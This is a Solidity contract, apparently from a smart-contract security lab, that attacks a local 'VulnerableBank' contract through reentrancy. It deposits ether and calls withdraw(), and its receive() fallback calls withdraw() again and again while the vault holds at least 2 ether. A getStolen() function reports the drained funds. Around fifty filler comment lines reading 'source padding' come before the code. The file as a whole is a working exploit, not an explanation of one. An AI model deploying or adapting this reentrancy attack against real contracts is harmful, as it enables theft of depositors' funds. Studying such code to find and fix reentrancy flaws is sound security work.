// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./VulnerableBank.sol";

// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
// source padding
contract WithdrawalProbe {
    VulnerableBank public vault;
    uint256 public callbacks;

    constructor(address _vault) {
        vault = VulnerableBank(payable(_vault));
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        callbacks++;
        if (address(vault).balance >= 2 ether) {
            vault.withdraw();
        }
    }

    function getStolen() external view returns (uint256) {
        return address(this).balance;
    }
}
